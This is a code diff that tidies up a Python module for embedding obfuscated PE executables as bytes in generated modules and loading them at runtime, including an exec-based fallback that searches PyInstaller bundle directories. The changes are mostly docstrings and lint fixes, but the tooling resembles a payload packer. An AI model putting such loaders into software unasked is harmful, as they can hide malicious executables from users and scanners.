@@ -1,5 +1,11 @@
+"""Embedded payload generation and loading utilities.
+
+This module provides functionality for embedding obfuscated PE payloads
+into Python modules and loading them at runtime.
+"""
 import hashlib
 import logging
+import sys
 from pathlib import Path
 from typing import Tuple, Optional
 
@@ -11,7 +17,7 @@ logger = logging.getLogger(__name__)
 def generate_embedded_payload_module(
     obfuscated_data: bytes,
     output_path: Path,
-    module_name: str = "embedded_payload",
+    module_name: str = "embedded_payload",  # pylint: disable=unused-argument
     embedded_key: Optional[bytes] = None,
 ) -> Tuple[str, str]:
     """Generate a Python module containing the obfuscated PE payload as bytes.
@@ -65,6 +71,9 @@ def load_embedded_payload(module_name: str = "embedded_payload") -> bytes:
 
     Returns:
         The obfuscated payload bytes
+
+    Raises:
+        RuntimeError: If the module cannot be loaded
     """
     try:
         module = __import__(module_name, fromlist=["EMBEDDED_PAYLOAD"])
@@ -72,7 +81,7 @@ def load_embedded_payload(module_name: str = "embedded_payload") -> bytes:
     except ImportError as e:
         raise RuntimeError(
             f"Failed to load embedded payload module '{module_name}': {e}"
-        )
+        ) from e
 
 
 def load_embedded_payload_and_key(
@@ -83,15 +92,21 @@ def load_embedded_payload_and_key(
     Tries import first; if unavailable (e.g., in packaged onefile with data), attempts
     to locate a sibling `embedded_payload.py` near the executable or in PyInstaller's
     _MEIPASS directory.
+
+    Args:
+        module_name: Name of the embedded payload module
+
+    Returns:
+        Tuple of (payload_bytes, key_bytes)
+
+    Raises:
+        RuntimeError: If the payload cannot be found
     """
     try:
         module = __import__(module_name, fromlist=["EMBEDDED_PAYLOAD", "EMBEDDED_KEY"])
         return module.EMBEDDED_PAYLOAD, getattr(module, "EMBEDDED_KEY", b"")
     except Exception:
         pass
-
-    import sys
-    import types
 
     candidates = []
     exe_dir = Path(getattr(sys, "_MEIPASS", Path(sys.argv[0]).resolve().parent))
@@ -102,7 +117,7 @@ def load_embedded_payload_and_key(
         if path.exists():
             ns: dict[str, object] = {}
             code = path.read_text(encoding="utf-8")
-            exec(compile(code, str(path), "exec"), ns)
+            exec(compile(code, str(path), "exec"), ns)  # pylint: disable=exec-used
             payload = ns.get("EMBEDDED_PAYLOAD", b"")
             key = ns.get("EMBEDDED_KEY", b"")
             if isinstance(payload, (bytes, bytearray)):
